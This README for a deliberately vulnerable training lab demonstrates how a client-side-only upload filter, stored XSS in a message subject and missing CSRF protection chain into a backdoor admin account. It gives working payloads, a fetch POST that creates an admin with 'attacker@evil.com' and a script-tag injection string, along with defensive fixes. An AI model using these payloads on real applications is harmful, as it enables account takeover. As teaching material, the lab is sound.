# File Upload Bypass + Stored XSS PoC Lab

A deliberately vulnerable web application demonstrating how a file upload bypass chains with stored XSS to create backdoor admin accounts -- without any malware or traditional exploitation.

**This is an educational lab for defensive security training. Do not deploy this anywhere publicly accessible.**

## What This Demonstrates

An attacker with a low-privilege user account chains two vulnerabilities:

1. **File upload bypass** -- The upload form restricts to `.pdf` via a client-side `accept` attribute, but the server performs zero file type validation. An attacker uploads a `.html` file containing JavaScript.

2. **Stored XSS via message subject** -- The messaging feature stores user input without sanitisation. The admin inbox renders the message subject as raw HTML. An attacker injects a `<script>` tag that loads their uploaded `.html` payload.

3. **No CSRF protection** -- The user management API has no CSRF token, so the XSS payload can silently create a new admin account using the victim admin's session.

The result: when an admin opens their inbox, the XSS fires, the JavaScript executes a POST to the user management API, and a backdoor admin account is created. Game over.

## Prerequisites

- Docker
- Docker Compose

## Setup

```bash
docker-compose up -d
```

Wait 10-15 seconds for MySQL to initialise, then visit http://localhost:8080

### Credentials

| Role  | Email              | Password |
|-------|--------------------|----------|
| Admin | admin@company.com  | admin    |
| User  | user@company.com   | user     |

## Attack Walkthrough

### Step 1: Login as the regular user

Navigate to http://localhost:8080 and login with `user@company.com` / `user`.

### Step 2: Create the XSS payload file

Create an HTML file locally (use the provided `payload.js` as reference):

```html
<html><body><script>
fetch("/api/manage-user.php", {
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "display_name=BackdoorAdmin&role=admin&email=attacker@evil.com&password=Compromised1!",
  method: "POST"
});
</script></body></html>
```

Save this as `payload.html`.

### Step 3: Upload the payload

Go to **Upload Files**. The form says "PDF only" but only enforces this client-side. Either:
- Rename the file to `payload.pdf` (the browser will still send the real MIME type), or
- Use browser dev tools to remove the `accept=".pdf"` attribute from the file input, or
- Use curl/Burp to upload directly

Upload `payload.html`. Note the file ID returned (e.g., `3`).

### Step 4: Craft the XSS message

Go to **Send Message**. In the subject field, enter:

```html
<script src="/api/download.php?file_id=3"></script>
```

(Replace `3` with the actual file ID from step 3.)

Put anything in the body. Tick priority if you want it at the top of the inbox. Send.

### Step 5: Wait for the admin to check their inbox

Log out. Log in as `admin@company.com` / `admin`. Go to **Inbox**.

The message subject renders as raw HTML. The `<script>` tag loads the uploaded payload via the download API. The JavaScript fires silently, creating a new admin account.

### Step 6: Verify the backdoor

Go to **Users**. You should see a new user: `BackdoorAdmin` with role `admin` and email `attacker@evil.com`.

Log out and log in with `attacker@evil.com` / `Compromised1!` to confirm.

## How the Chain Works

```
Upload bypass     -->  Malicious HTML stored in DB as BLOB
                       served back with original Content-Type via download API
                            |
Stored XSS        -->  Unsanitised subject rendered in admin inbox
                       <script src="/api/download.php?file_id=3">
                            |
No CSRF            -->  XSS payload calls /api/manage-user.php
                       using admin's session cookie (credentials: "include")
                            |
Backdoor created   -->  New admin account: attacker@evil.com
```

Three individually "minor" issues. Together: full admin compromise.

## Defensive Measures

What should have been done:

1. **Server-side file type validation** -- Check MIME type, file extension, and magic bytes. Don't trust the client.
2. **Output encoding** -- Use `htmlspecialchars()` on all user-controlled output. The inbox renders `$row['subject']` raw.
3. **Content-Security-Policy headers** -- A strict CSP would block inline scripts and unauthorised script sources.
4. **CSRF tokens** -- Every state-changing request should validate a CSRF token. The manage-user API accepts bare POST requests.
5. **Content-Disposition: attachment** -- Force downloads instead of inline rendering for user-uploaded files.
6. **Access controls on uploads** -- The download API serves any file to any authenticated user. Files should be scoped to their owner.

## Cleanup

```bash
docker-compose down -v
```

## Disclaimer

This application is deliberately vulnerable. It is designed for educational and defensive security training purposes only. Do not deploy it on any network accessible to untrusted users. Do not use these techniques against systems without explicit written authorisation.
